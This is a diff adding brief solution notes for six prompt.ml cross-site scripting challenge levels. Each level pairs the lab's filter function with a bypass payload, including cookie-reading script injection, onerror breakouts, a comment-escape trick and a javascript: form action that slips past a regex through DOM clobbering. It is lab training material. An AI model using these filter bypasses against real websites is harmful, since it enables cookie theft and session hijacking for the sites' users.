@@ -1,0 +1,79 @@
+Lab link: https://prompt.ml/
+
+1)"><script>alert(document.cookie)</script>
+
+2) function escape(input) {
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /<\/?[^>]+>/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '<article>' + input + '</article>';
+}    
+
+To escape from article it is not letting js code we can inject :</article><img src=x onerror=alert(1)
+
+3) In this lab ) is being escaped by the server so we can use:<script>alert`401`</script>
+4)Lets see the function :function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/->/g, '_');
+
+    // comment the input to avoid script execution
+    return '<!-- ' + input + ' -->';
+}     
+This function is made to escape or comment out the tags or anything inside the input so we can escape using --!> as it is rejecting -->
+Payload:--!><script>alert(1)</script
+
+5) hello" type=image src=x onerror
+="alert(1)
+For code interpreted as : <input value="hello" type=image src=x onerror
+="alert(1)" type="text">
+
+6) https://prompt.ml/6
+This lab is based on basic example of dom clobering concept:
+
+function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{"name":"Matt"}
+        var segments = input.split('#');
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
+
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
+
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData[i]);
+        }
+
+        return form.outerHTML + '                         \n\
+<script>                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write("Action forbidden.")               \n\
+</script>                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}        
+
+ Payload use: javascript:alert(document.domain)#{"action":"Matt"}
+ Interpreted code :
+ 
+ <form action="javascript:alert(document.domain)" method="post"><input name="action" value="Matt"></form>                         
+<script>                                                  
+    // forbid javascript: or vbscript: and data: stuff    
+    if (!/script:|data:/i.test(document.forms[0].action)) 
+        document.forms[0].submit();                       
+    else                                                  
+        document.write("Action forbidden.")               
+</script>                                                
+        
